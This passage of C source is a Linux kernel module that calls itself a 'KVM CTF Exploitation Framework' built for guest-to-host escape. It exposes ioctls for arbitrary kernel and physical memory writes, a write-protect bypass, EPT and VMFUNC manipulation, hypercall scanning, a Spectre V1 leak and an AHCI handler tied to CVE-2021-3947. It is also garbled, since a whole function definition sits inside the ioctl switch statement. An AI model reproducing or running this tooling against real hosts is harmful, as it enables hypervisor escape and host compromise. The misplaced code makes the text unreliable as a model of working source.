            if (!map) return -ENOMEM;
            
            ret = map_guest_memory_targeted(map);
            if (ret == 0 && copy_to_user((void __user *)arg, map, sizeof(*map)))
                ret = -EFAULT;
            
            kfree(map);
            return ret;
        }

        /* ---------- Memory Write Operations ---------- */
        case IOCTL_WRITE_KERNEL_MEM: {
            struct kernel_mem_write req;
            unsigned char *kbuf;
            int ret;
            
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) 
                return -EFAULT;
            if (req.length > 1024*1024) return -EINVAL;
            
            kbuf = kmalloc(req.length, GFP_KERNEL);
            if (!kbuf) return -ENOMEM;
            
            if (copy_from_user(kbuf, req.user_buffer, req.length)) {
                kfree(kbuf);
                return -EFAULT;
            }
            
            ret = write_kernel_memory_targeted(req.kernel_addr, kbuf, req.length);
            kfree(kbuf);
            return ret;
        }

        case IOCTL_WRITE_PHYSICAL_MEM: {
            struct physical_mem_write req;
            unsigned char *kbuf;
            int ret;
            
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) 
                return -EFAULT;
            if (req.length > 1024*1024) return -EINVAL;
            
            kbuf = kmalloc(req.length, GFP_KERNEL);
            if (!kbuf) return -ENOMEM;
            
            if (copy_from_user(kbuf, req.user_buffer, req.length)) {
                kfree(kbuf);
                return -EFAULT;
            }
            
            ret = write_physical_memory(req.phys_addr, kbuf, req.length);
            kfree(kbuf);
            return ret;
        }

        /* ---------- Address Conversion ---------- */
        case IOCTL_VIRT_TO_PHYS: {
            struct virt_to_phys_request req;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) 
                return -EFAULT;
            convert_virt_to_phys(req.virt_addr, &req);
            return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : req.status;
        }

        /* ---------- EPT Walking (5-level) ---------- */
        case IOCTL_WALK_EPT: {
            struct ept_walk_request req;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) 
                return -EFAULT;
            walk_ept_tables_modern(req.eptp, req.gpa, &req);
            if (copy_to_user((void __user *)arg, &req, sizeof(req))) 
                return -EFAULT;
            return (req.status == 0) ? 0 : req.status;
        }

        /* ---------- Hypercall Operations ---------- */
        case IOCTL_HYPERCALL: {
#ifdef CONFIG_X86
            struct hypercall_request req;
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) 
                return -EFAULT;
            req.ret = do_kvm_hypercall(req.nr, req.a0, req.a1, req.a2, req.a3);
            if (copy_to_user((void __user *)arg, &req, sizeof(req))) 
                return -EFAULT;
            return 0;
#else
            return -ENOSYS;
#endif
        }

        case IOCTL_HYPERCALL_SCAN: {
#ifdef CONFIG_X86
            struct {
                unsigned long start;
                unsigned long end;
                unsigned long __user *results;
                int max_results;
            } scan_req;
            
            if (copy_from_user(&scan_req, (void __user *)arg, sizeof(scan_req))) 
                return -EFAULT;
            
            hypercall_scanner(scan_req.start, scan_req.end, 
                              scan_req.results, scan_req.max_results);
            return 0;
#else
            return -ENOSYS;
#endif
        }

        /* ---------- VMFUNC / EPT Switching ---------- */
        case IOCTL_TEST_VMFUNC: {
#ifdef CONFIG_X86
            int eptp_index = (int)arg;
            vmfunc_switch_ept(eptp_index);
            printk(KERN_INFO "%s: VMFUNC EPTP switch to index %d\n", 
                   DRIVER_NAME, eptp_index);
            return 0;
#else
            return -ENOSYS;
#endif
        }

        /* ---------- IOMMU Probe ---------- */
    static int read_physical_memory(unsigned long phys_addr, unsigned char *buffer, size_t size)
{
    void *virt_addr;
    unsigned long orig_cr0 = 0;
    
    /* For RAM addresses, we can just use __va + memcpy */
    if (phys_addr < 0x100000000UL) {  /* Below 4GB is likely RAM */
        virt_addr = __va(phys_addr);
        
        /* Temporarily disable WP if needed */
        orig_cr0 = disable_wp_targeted();
        
        /* Direct memcpy - no ioremap needed for RAM */
        memcpy(buffer, virt_addr, size);
        
        if (orig_cr0)
            restore_wp(orig_cr0);
            
        return 0;
    }
    
    /* For device memory (MMIO), use ioremap */
    void __iomem *mapped;
    unsigned long offset;
    size_t chunk_size, remaining = size, copied = 0;

    while (remaining > 0) {
        offset = phys_addr & ~PAGE_MASK;
        chunk_size = min(remaining, (size_t)(PAGE_SIZE - offset));
        mapped = ioremap(phys_addr & PAGE_MASK, PAGE_SIZE);
        if (!mapped) 
            return copied > 0 ? 0 : -EFAULT;
        memcpy_fromio(buffer + copied, mapped + offset, chunk_size);
        iounmap(mapped);
        copied += chunk_size;
        phys_addr += chunk_size;
        remaining -= chunk_size;
    }
    return 0;
}

        /* ---------- VAPIC Backing Page ---------- */
        case IOCTL_VAPIC_READ_PAGE: {
#ifdef CONFIG_X86
            unsigned long vapic_addr = get_vapic_addr();
            
            if (vapic_addr && arg) {
                unsigned char __user *user_buf = (unsigned char __user *)arg;
                unsigned char *kernel_buf;
                
                kernel_buf = kmalloc(4096, GFP_KERNEL);
                if (!kernel_buf) return -ENOMEM;
                
                read_kernel_memory(vapic_addr, kernel_buf, 4096);
                if (copy_to_user(user_buf, kernel_buf, 4096)) {
                    kfree(kernel_buf);
                    return -EFAULT;
                }
                kfree(kernel_buf);
                return 0;
            }
            return -ENOENT;
#else
            return -ENOSYS;
#endif
        }

        /* ---------- Spectre V1 ---------- */
        case IOCTL_SPECTRE_V1: {
#ifdef CONFIG_X86
            unsigned long offset = (unsigned long)arg;
            spectre_v1_leak(offset);
            return 0;
#else
            return -ENOSYS;
#endif
        }

        /* ---------- Cache Operations ---------- */
        case IOCTL_WBINVD: {
#ifdef CONFIG_X86
            printk(KERN_INFO "%s: WBINVD - flushing all caches\n", DRIVER_NAME);
            wbinvd_all_cpus();
            return 0;
#else
            return -ENOSYS;
#endif
        }

        case IOCTL_WRITE_AND_FLUSH: {
#ifdef CONFIG_X86
            struct write_flush_request req;
            unsigned char *kbuf;
            int ret;

            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) 
                return -EFAULT;
            if (!req.size || req.size > 1024 * 1024) 
                return -EINVAL;

            kbuf = kmalloc(req.size, GFP_KERNEL);
            if (!kbuf) return -ENOMEM;

            if (copy_from_user(kbuf, (void __user *)req.buffer, req.size)) {
                kfree(kbuf);
                return -EFAULT;
            }

            ret = write_physical_and_flush(req.phys_addr, kbuf, req.size);
            kfree(kbuf);
            return ret;
#else
            return -ENOSYS;
#endif
        }

        /* ---------- AHCI (CVE-2021-3947) ---------- */
        case IOCTL_AHCI_SET_FIS_BASE: {
#ifdef CONFIG_X86
            struct ahci_fis_request req;
            
            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) 
                return -EFAULT;
            
            return ahci_set_fis_base(req.port, req.fis_base);
#else
            return -ENOSYS;
#endif
        }

        default:
            return -ENOTTY;
    }

    return 0;
}

/* ========================================================================
 * File Operations
 * ======================================================================== */
static int driver_open(struct inode *inode, struct file *file) { return 0; }
static int driver_release(struct inode *inode, struct file *file) { return 0; }

static struct file_operations fops = {
    .owner = THIS_MODULE,
    .open = driver_open,
    .release = driver_release,
    .unlocked_ioctl = driver_ioctl,
    .compat_ioctl = driver_ioctl,
};

/* ========================================================================
 * Module Init/Exit
 * ======================================================================== */
static int __init mod_init(void)
{
    printk(KERN_INFO "%s: KVM CTF Exploitation Framework v3.0\n", DRIVER_NAME);
    printk(KERN_INFO "%s: Targeted WP bypass only - NO CR0 WARNING\n", DRIVER_NAME);
    
    kallsyms_lookup_init();
    init_kaslr();
    init_symbol_database();

    major_num = register_chrdev(0, DEVICE_FILE_NAME, &fops);
    if (major_num < 0) return major_num;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 4, 0)
    driver_class = class_create(DRIVER_NAME);
#else
    driver_class = class_create(THIS_MODULE, DRIVER_NAME);
#endif
    if (IS_ERR(driver_class)) { 
        unregister_chrdev(major_num, DEVICE_FILE_NAME); 
        return PTR_ERR(driver_class); 
    }

    driver_device = device_create(driver_class, NULL, MKDEV(major_num, 0), 
                                  NULL, DEVICE_FILE_NAME);
    if (IS_ERR(driver_device)) { 
        class_destroy(driver_class); 
        unregister_chrdev(major_num, DEVICE_FILE_NAME); 
        return PTR_ERR(driver_device); 
    }

    /* Run CTF challenges on init */
#ifdef CONFIG_X86
    ctf_2023_challenge();
    ctf_2024_challenge();
    ctf_2025_challenge();
#endif

    printk(KERN_INFO "%s: /dev/%s created. Ready for guest-to-host escape.\n", 
           DRIVER_NAME, DEVICE_FILE_NAME);
    return 0;
}

static void __exit mod_exit(void)
{
    if (ahci_mmio) iounmap(ahci_mmio);
    if (driver_device) device_destroy(driver_class, MKDEV(major_num, 0));
    if (driver_class) class_destroy(driver_class);
    if (major_num >= 0) unregister_chrdev(major_num, DEVICE_FILE_NAME);
    printk(KERN_INFO "%s: Unloaded - CTF complete\n", DRIVER_NAME);
}

module_init(mod_init);
module_exit(mod_exit);
